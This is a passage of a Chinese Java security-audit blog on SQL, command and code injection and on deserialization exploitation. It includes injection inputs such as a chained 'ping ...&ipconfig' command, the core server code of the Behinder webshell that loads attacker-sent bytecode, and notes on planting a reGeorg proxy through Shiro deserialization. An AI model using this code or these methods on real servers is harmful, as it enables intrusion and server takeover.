class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-type">name</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;name&#x27;</span> #语义不对 <br></code></pre></td></tr></table></figure><h4 id="3．防御不当造成SQL注入"><a href="#3．防御不当造成SQL注入" class="headerlink" title="3．防御不当造成SQL注入"></a>3．防御不当造成SQL注入</h4><p>SQL注入最主要的成因在于未对用户输入进行严格的过滤，并采取不恰当的方式构造SQL语句。在实际开发的过程中，有些地方难免需要使用拼接构造SQL语句，例如SQL语句中order by后面的参数无法使用预编译赋值。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。</p><h4 id="4-用java-PreparedStatement就不用担心sql注入了吗？"><a href="#4-用java-PreparedStatement就不用担心sql注入了吗？" class="headerlink" title="4.用java PreparedStatement就不用担心sql注入了吗？"></a>4.<a href="https://www.cnblogs.com/iyangyuan/p/4809494.html">用java PreparedStatement就不用担心sql注入了吗？</a></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span> <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from goods where min_name = ?&quot;</span>;  <span class="hljs-comment">// 含有参数</span><br><span class="hljs-number">2</span> <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-number">3</span> st.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;儿童&quot;</span>); <span class="hljs-comment">// 参数赋值</span><br><span class="hljs-number">4</span> System.out.println(st.toString()); <span class="hljs-comment">//com.mysql.jdbc.JDBC4PreparedStatement@d704f0: select * from goods where min_name = &#x27;儿童&#x27;</span><br></code></pre></td></tr></table></figure><p>这段代码属于JDBC常识了，就是简单的根据参数查询，看不出什么端倪，但假如有人使坏，想注入一下呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span> <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from goods where min_name = ?&quot;</span>;  <span class="hljs-comment">// 含有参数</span><br><span class="hljs-number">2</span> <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-number">3</span> st.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;儿童&#x27;&quot;</span>); <span class="hljs-comment">// 参数赋值</span><br><span class="hljs-number">4</span> System.out.println(st.toString()); <span class="hljs-comment">//com.mysql.jdbc.JDBC4PreparedStatement@d704f0: select * from goods where min_name = &#x27;儿童\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>  简单的在参数后边加一个单引号，就可以快速判断是否可以进行SQL注入，这个百试百灵，如果有漏洞的话，一般会报错。</p><p>  之所以PreparedStatement能防止注入，是因为它把单引号转义了，变成了&#39;，这样一来，就无法截断SQL语句，进而无法拼接SQL语句，基本上没有办法注入了。</p><p> 所以，如果不用PreparedStatement，又想防止注入，最简单粗暴的办法就是过滤单引号，过滤之后，单纯从SQL的角度，无法进行任何注入。</p><p> 其实，刚刚我们提到的是String参数类型的注入，大多数注入，还是发生在数值类型上，幸运的是PreparedStatement为我们提供了st.setInt(1, 999);这种数值参数赋值API，基本就避免了注入，因为如果用户输入的不是数值类型，类型转换的时候就报错了。</p><p>好，现在读者已经了解PreparedStatement会对参数做转义，接下来再看个例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from goods where min_name = ?&quot;</span>;  <span class="hljs-comment">// 含有参数</span><br><span class="hljs-number">2</span> <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-number">3</span> st.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;儿童%&quot;</span>); <span class="hljs-comment">// 参数赋值</span><br><span class="hljs-number">4</span> System.out.println(st.toString()); <span class="hljs-comment">//com.mysql.jdbc.JDBC4PreparedStatement@8543aa: select * from goods where min_name = &#x27;儿童%&#x27;</span><br></code></pre></td></tr></table></figure><p>   我们尝试输入了一个百分号，发现PreparedStatement竟然没有转义，百分号恰好是like查询的通配符。</p><p>   正常情况下，like查询是这么写的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from goods where min_name like ?&quot;</span>;  <span class="hljs-comment">// 含有参数</span><br><span class="hljs-number">2</span> st = conn.prepareStatement(sql);<br><span class="hljs-number">3</span> st.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;儿童&quot;</span> + <span class="hljs-string">&quot;%&quot;</span>); <span class="hljs-comment">// 参数赋值</span><br><span class="hljs-number">4</span> System.out.println(st.toString()); <span class="hljs-comment">//com.mysql.jdbc.JDBC4PreparedStatement@8543aa: select * from goods where min_name like &#x27;儿童%&#x27;</span><br></code></pre></td></tr></table></figure><p>查询min_name字段以”儿童”开头的所有记录，其中”儿童”二字是用户输入的查询条件，百分号是我们自己加的，怎么可能让用户输入百分号嘛！等等！如果用户非常聪明，偏要输入百分号呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from goods where min_name like ?&quot;</span>;  <span class="hljs-comment">// 含有参数</span><br>st = conn.prepareStatement(sql);<br>st.setString(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;%儿童%&quot;</span> + <span class="hljs-string">&quot;%&quot;</span>); <span class="hljs-comment">// 参数赋值</span><br>System.out.println(st.toString()); <span class="hljs-comment">//com.mysql.jdbc.JDBC4PreparedStatement@8543aa: select * from goods where min_name like &#x27;%儿童%%&#x27;</span><br></code></pre></td></tr></table></figure><p>   聪明的用户直接输入了”%儿童%”，整个查询的意思就变了，变成包含查询。实际上不用这么麻烦，用户什么都不输入，或者只输入一个%，都可以改变原意。</p><p>   虽然此种SQL注入危害不大，但这种查询会耗尽系统资源，从而演化成拒绝服务攻击。</p><p>   那如何防范呢？笔者能想到的方案如下：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">·直接拼接SQL语句，然后自己实现所有的转义操作。这种方法比较麻烦，而且很可能没有PreparedStatement做的好，造成其他更大的漏洞，不推荐。<br><br>       ·直接简单暴力的过滤掉%。笔者觉得这方案不错，如果没有严格的限制，随便用户怎么输入，既然有限制了，就干脆严格一些，干脆不让用户搜索%，推荐。<br><br></code></pre></td></tr></table></figure><p>  注意，JDBC只是java定义的规范，可以理解成接口，每种数据库必须有自己的实现，实现之后一般叫做数据库驱动，本文所涉及的PreparedStatement，是由MySQL实现的，并不是JDK实现的默认行为，也就是说，不同的数据库表现不同，不能一概而论。</p><h4 id="5-MyBatis框架中常见的SQL注入"><a href="#5-MyBatis框架中常见的SQL注入" class="headerlink" title="5.MyBatis框架中常见的SQL注入"></a>5.MyBatis框架中常见的SQL注入</h4><h5 id="0x01-在使用MyBatis框架时，有以下场景极易产生SQL注入。"><a href="#0x01-在使用MyBatis框架时，有以下场景极易产生SQL注入。" class="headerlink" title="0x01 在使用MyBatis框架时，有以下场景极易产生SQL注入。"></a>0x01 在使用MyBatis框架时，有以下场景极易产生SQL注入。</h5><ol><li><p>SQL语句中的一些部分，例如order by字段、表名等，是无法使用预编译语句的。这种场景极易产生SQL注入。推荐开发在Java层面做映射，设置一个字段&#x2F;表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。</p></li><li><p>like参数注入。使用如下SQL语句可防止SQL注入</p><blockquote><p>like concat(‘%’,#{title}, ‘%’)</p></blockquote></li><li><p>in之后参数的SQL注入。使用如下SQL语句可防止SQL注入</p></li></ol><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">id in<br>&lt;<span class="hljs-keyword">foreach</span> collection=<span class="hljs-string">&quot;ids&quot;</span> item=<span class="hljs-string">&quot;item&quot;</span> <span class="hljs-keyword">open</span>=<span class="hljs-string">&quot;(&quot;</span>separator=<span class="hljs-string">&quot;,&quot;</span> <span class="hljs-keyword">close</span>=<span class="hljs-string">&quot;)&quot;</span>&gt;<br><span class="hljs-comment">#&#123;item&#125; </span><br>&lt;/<span class="hljs-keyword">foreach</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="0x02-x-generator的SQL注入"><a href="#0x02-x-generator的SQL注入" class="headerlink" title="0x02 x-generator的SQL注入"></a>0x02 x-generator的SQL注入</h5><p>为了提高开发效率，一些generator工具被开发出来，generator是一个从数据库结构 自动生成实体类、Mapper接口以及对应的XML文件的工具。常见的generator有mybatis-generator，renren-generator等。</p><p>mybatis-generator是mybatis官方的一款generator。在mybatis-generator自动生成的SQL语句中，order by使用的是$，也就是简单的字符串拼接，这种情况下极易产生SQL注入。需要开发者特别注意。</p><p>不过，mybatis-generator产生的like语句和in语句全部都是用的参数符号#，都是非常安全的实现。</p><h4 id="6-MyBatis和MyBatis可能导致的sql注入"><a href="#6-MyBatis和MyBatis可能导致的sql注入" class="headerlink" title="6.MyBatis和MyBatis可能导致的sql注入"></a>6.<strong>MyBatis和MyBatis可能导致的sql注入</strong></h4><p>前面说了<code>$&#123;&#125;</code>这种传值方式不会给传入的值添加引号的，所以我们传入的String类型带到数据库中查询时也不会加引号，从而导致sql查询报错。解决办法是手动在xml文件中添加引号，如下：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211633458.png" alt="image-20220421163316344"></p><p>但是<code>$&#123;&#125;</code>这种方式在动态排序时更加好用，比如当需要根据数据库字段id进行降序排列查询结果，<code>#&#123;&#125;</code>由于会给传入的值自动加上引号，导致查询语句变为了<code>select * from user order by &#39;id&#39; desc</code>，此时会根据一个字符常量进行排序，显然不能得到我们想要的结果，此时就必须使用<code>$&#123;&#125;</code>这种方式了，因此在涉及到排序相关的业务时很容易导致sql输入的产生。</p><h3 id="5-1-3-命令注入"><a href="#5-1-3-命令注入" class="headerlink" title="5.1.3　命令注入"></a>5.1.3　命令注入</h3><p>命令注入（Command Injection）是指在某种开发需求中，需要引入对系统本地命令的支持来完成某些特定的功能。当未对可控输入的参数进行严格的过滤时，则有可能发生命令注入。攻击者可以使用命令注入来执行系统终端命令，直接接管服务器的控制权限。</p><p>在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令。Java的Runtime类可以提供调用系统命令的功能。如下代码可根据用户输入的指令执行系统命令。由于CMD参数可控，用户可以在服务器上执行任意系统命令，相当于获得了服务器权限。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202150535.png" alt="image-20220420215014460"></p><p>图5-2　命令注入的执行结果</p><h4 id="1．命令注入的局限"><a href="#1．命令注入的局限" class="headerlink" title="1．命令注入的局限"></a>1．命令注入的局限</h4><p>系统命令支持使用连接符来执行多条语句，常见的连接符有“|”“||”“&amp;”“&amp;&amp;”，其含义如表5-1所示。</p><p>表5-1　常见连接符及其含义<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202156909.png" alt="image-20220420215634845"></p><p>例如命令“ping <a href="http://www.baidu.com&ipconfig”的执行效果如图5-3所示,执行ping命令后才执行ipconfig命令./">www.baidu.com&amp;ipconfig”的执行效果如图5-3所示，执行ping命令后才执行ipconfig命令。</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202157858.png" alt="image-20220420215704768"></p><p>图5-3　在Windows系统的CMD执行命令“ping<a href="http://www.baidu.com&ipconfig”/">www.baidu.com&amp;ipconfig”</a></p><p>对于Java环境中的命令注入，连接符的使用存在一些局限。例如如下示例代码，使用ping命令来诊断网络。其中url参数为用户可控，当恶意用户输入“<a href="http://www.baidu.com&ipconfig”时,拼接出的系统命令为“ping/">www.baidu.com&amp;ipconfig”时，拼接出的系统命令为“ping</a> <a href="http://www.baidu.com&ipconfig”,该命令在命令行终端可以成功执行.然而在java运行环境下,却执行失败.在该java程序的处理中,“www.baidu.com&ipconfig/">www.baidu.com&amp;ipconfig”，该命令在命令行终端可以成功执行。然而在Java运行环境下，却执行失败。在该Java程序的处理中，“www.baidu.com&amp;ipconfig</a> ”被当作一个完整的字符串而非两条命令。因此以下代码片段不存在命令注入漏洞。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202200358.png" alt="image-20220420220011290"></p><h4 id="2．无法进行命令注入的原因"><a href="#2．无法进行命令注入的原因" class="headerlink" title="2．无法进行命令注入的原因"></a>2．无法进行命令注入的原因</h4><p>Runtime类中exec方法存在如下几种实现，显而易见，要执行的命令可以通过字符串和数组的方式传入。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211128966.png" alt="image-20220421112836491"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211129781.png" alt="image-20220421112907702"></p><p>当传入的参数类型为字符串时，会先经过StringTokenizer的处理，主要是针对空格以及换行符等空白字符进行处理，后续会分割出一个cmdarray数组保存分割后的命令参数，其中cmdarray的第一个元素为所要执行的命令，这一点可以从图5-4～图5-6中发现。经过处理后的参数“ <a href="http://www.baidu.com&ipconfig/">www.baidu.com&amp;ipconfig</a> ”成为“ping”命令的参数，因此此时的连接符“&amp;”并不生效，从而无法注入系统命令。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211132969.png" alt="image-20220421113208897"></p><p>图5-4　StringTokenizer 方法处理<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211132492.png" alt="image-20220421113224397"></p><p>图5-5　cmdarray参数<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211132757.png" alt="image-20220421113244649"></p><p>图5-6　Process的start方法</p><h3 id="5-1-4-代码注入"><a href="#5-1-4-代码注入" class="headerlink" title="5.1.4　代码注入"></a>5.1.4　代码注入</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p>代码注入（Code Injection）与命令注入相似,指在正常的Java程序中注入一段Java代码并执行。相比于命令注入，代码注入更具有灵活性，注入的代码可以写入或修改系统文件，甚至可以直接注入执行系统命令的代码。在实际的漏洞利用中，直接进行系统命令执行常常受到各方面的因素限制，而代码注入因为灵活多变，可利用Java的各种技术突破限制，造成更大的危害。</p><p>产生代码注入漏洞的前提条件是将用户输入的数据作为Java代码进行执行。</p><p>由此所见，程序要有相应的功能能够将用户输入的数据当作代码执行，而Java反射就可以实现这样的功能：根据传入不同的类名、方法名和参数执行不同的功能。代码清单如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211309285.png" alt="image-20220421130856174"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211309704.png" alt="image-20220421130912634"></p><p>Apache Commons collections组件3.1版本有一段利用反射来完成特定功能的代码。控制相关参数后，就可以进行代码注入，而攻击者可以通过反序列化的方式控制相关参数，完成注入代码，达到执行任意代码的效果。关键方法如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211324688.png" alt="image-20220421132414607"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211324379.png" alt="image-20220421132426315"></p><p>与命令注入相比，代码注入更具有灵活性。例如在ApacheCommons collections反序列化漏洞中直接使用Runtime.getRuntime().exec()执行系统命令是无回显的。有安全研究员研究出可回显的利用方式，其中一种思路是通过URLloader远程加载类文件以及异常处理机制构造出可以回显的利用方式。具体的操作步骤如下。</p><p>首先构造出一个恶意类代码，并编译成Jar包放置在远程服务器上。然后利用Apache Commons collections反序列化漏洞可以注入任意代码的特点，构造出如下所示的PoC。最终的利用效果如图5-7所示，可以发现系统执行了“whoami”指令，错误信息携带有系统用户名。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211337583.png" alt="image-20220421133724521"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211337885.png" alt="image-20220421133737787"></p><p>图5-7　Apache Commons collections反序列化漏洞PoC执行结果<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211342727.png" alt="image-20220421134237651"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211342482.png" alt="image-20220421134248394"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211343305.png" alt="image-20220421134305220"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211343674.png" alt="image-20220421134321589"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211343241.png" alt="image-20220421134337155"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211343294.png" alt="image-20220421134349207"></p><p>在将用户可控部分数据注入代码达到动态执行某些功能的目的之前，需进行严格的检测和过滤，避免用户注入恶意代码，造成系统的损坏和权限的丢失。</p><h4 id="2-《Java代码执行漏洞中类动态加载的应用》"><a href="#2-《Java代码执行漏洞中类动态加载的应用》" class="headerlink" title="2.《Java代码执行漏洞中类动态加载的应用》"></a>2.《Java代码执行漏洞中类动态加载的应用》</h4><h5 id="Java类动态加载"><a href="#Java类动态加载" class="headerlink" title="Java类动态加载"></a><strong>Java类动态加载</strong></h5><p>Java中类的加载方式分为显式和隐式，隐式加载是通过new等途径生成的对象时Jvm把相应的类加载到内存中，显示加载是通过 Class.forName(..) 等方式由程序员自己控制加载，而显式类加载方式也可以理解为类动态加载，我们也可以自定义类加载器去加载任意的类。</p><h5 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a><strong>自定义ClassLoader</strong></h5><p>java.lang.ClassLoader是所有的类加载器的父类，其他子类加载器例如URLClassLoader 都是通过继承 java.lang.ClassLoader 然后重写父类方法从而实现了加载目录 class 文件或者远程资源文件</p><p>在网站管理工具”冰蝎”中用到了这种方法</p><p>冰蝎服务端核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;<br>   U(ClassLoader c)&#123;<br>       <span class="hljs-built_in">super</span>(c);<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);<br>  &#125;<br><br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(classBytes).newInstance().equals(pageContext);<br></code></pre></td></tr></table></figure><p>代码中创建了U类继承 ClassLoader ，然后自定义一个名为 g 的方法，接收字节数组类型的参数并调用父类的 defineClass 动态解析字节码返回 Class 对象，然后实例化该类并调用 equals 方法，传入 jsp 上下文中的 pageContext 对象。</p><p>其中 bytecode 就是由冰蝎客户端发送至服务端的字节码，改字节码所代表的类中重写了 equals 方法，从 pageContext 中提取 request ，response 等对象作参数的获取和执行结果的返回</p><h5 id="反射调用defineClass"><a href="#反射调用defineClass" class="headerlink" title="反射调用defineClass"></a><strong>反射调用defineClass</strong></h5><p>上文中新建了一个类来实现动态加载字节码的功能，但在某些利用场景使用有一定限制，所以也可以通过直接反射调用 ClassLoader 的 defineClass 方法动态加载字节码而不用新建其他 Java 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>defineClassMethod.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>()&#123;&#125;, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>在调用 defineClass 时，重新实例化了一个 ClassLoader ，new ClassLoader(){} ，这是因为在 Java 中类的唯一性由类加载器和类本身决定，如果沿用当前上下文中的类加载器实例，而 POC 中使用同一个类名多次攻击，可能出现类重复定义异常<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204211800950.png" alt="图片"></p><h5 id="Shiro反序列化上载reGeorg代理"><a href="#Shiro反序列化上载reGeorg代理" class="headerlink" title="Shiro反序列化上载reGeorg代理"></a><strong>Shiro反序列化上载reGeorg代理</strong></h5><p>举个实际应用的例子，针对一个完全不出网的 Spring Boot + Shiro 程序如何进行内网渗透，这种情况下不能写 jsp 马，而且不能出网自然不能作反弹 shell 等操作，要进行内网渗透我觉得最好的方式就是动态注册filter或者 servlet ，并将 reGeorg 的代码嵌入其中，但如果将 POC 都写在 header 中，肯定会超过中间件 header 长度限制，当然在某些版本也有办法修改这个长度限制，参考（基于全局储存的新思路 | Tomcat的一种通用回显方法研究）<a href="https://blog.csdn.net/weixin_39977642/article/details/111112900%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%87%87%E7%94%A8%E4%B8%8A%E6%96%87%E4%B8%AD%E4%BB%8E%E5%A4%96%E9%83%A8%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E5%B0%B1%E8%BF%8E%E5%88%83%E8%80%8C%E8%A7%A3%E3%80%82">https://blog.csdn.net/weixin_39977642/article/details/111112900，如果采用上文中从外部加载字节码的方法那么这个问题就迎刃而解。</a></p><p>关键:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况。<br><br>假设WebApp A依赖了common-collection <span class="hljs-number">3.1</span>，而WebApp B依赖了common-collection <span class="hljs-number">3.2</span> 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。<br><br>那么如何破坏Java原有的类加载机制呢？如果上层的ClassLoader需要调用下层的ClassLoader怎么办呢？就需要使用Thread Context ClassLoader，线程上下文类加载器。Thread类中有get<span class="hljs-constructor">ContextClassLoader()</span>和set<span class="hljs-constructor">ContextClassLoader(ClassLoader <span class="hljs-params">cl</span>)</span>方法用来获取和设置上下文类加载器，如果没有set<span class="hljs-constructor">ContextClassLoader(ClassLoader <span class="hljs-params">cl</span>)</span>方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为<span class="hljs-constructor">WebAppClassLoader(在一些框架中可能是继承了<span class="hljs-params">public</span> <span class="hljs-params">abstract</span> WebappClassLoaderBase的其他Loader)</span>。<br><br>说了那么多，其实WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。<br></code></pre></td></tr></table></figure><h4 id="改造ysoserial"><a href="#改造ysoserial" class="headerlink" title="改造ysoserial"></a><strong>改造ysoserial</strong></h4><p>为了在 ysoserial 中正常使用下文中提到的类，需要先在 pom.xml 中加入如下依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>要让反序列化时运行指定的 Java 代码，需要借助 TemplatesImpl ，在 ysoserial 中新建一个类并继承 AbstractTranslet ，这里有不理解的可以参考（有关TemplatesImpl的反序列化漏洞链）</p><p>静态代码块中获取了 Spring Boot 上下文里的 request ，response 和 session ，然后获取 classData 参数并通过反射调用 defineClass 动态加载此类，实例化后调用其中的 equals 方法传入 request ，response 和 session 三个对象</p><p> 这个太重要了 详见<a href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247484622&idx=1&sn=8ec625711dcf87f0b6abe67483f0534d">https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&amp;mid=2247484622&amp;idx=1&amp;sn=8ec625711dcf87f0b6abe67483f0534d</a></p><h4 id="3-Java回显综述"><a href="#3-Java回显综述" class="headerlink" title="3.Java回显综述"></a>3.Java回显综述</h4><p><a href="https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ">https://mp.weixin.qq.com/s/0fWSp71yuaxL_TkZV65EwQ</a></p><h5 id="回显的几种方式"><a href="#回显的几种方式" class="headerlink" title="回显的几种方式"></a><strong>回显的几种方式</strong></h5><ul><li>直接调用defineClass</li><li>RMI绑定实例结合</li><li>获取resp写入回显结果</li><li>异常抛出 报错回显</li><li>写文件</li><li>Dnslog</li></ul><h5 id="回显方式分析"><a href="#回显方式分析" class="headerlink" title="回显方式分析"></a><strong>回显方式分析</strong></h5><h6 id="1-RMI绑定实例结合"><a href="#1-RMI绑定实例结合" class="headerlink" title="1.RMI绑定实例结合"></a><strong>1.RMI绑定实例结合</strong></h6><p>**(1) RMI&#x2F;IIOP RCE回显的原理*</p><p><strong>基本原理</strong></p><p>talk is cheap，let‘s see the code</p><p>1.定义一个Echo接口，继承Remote类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> 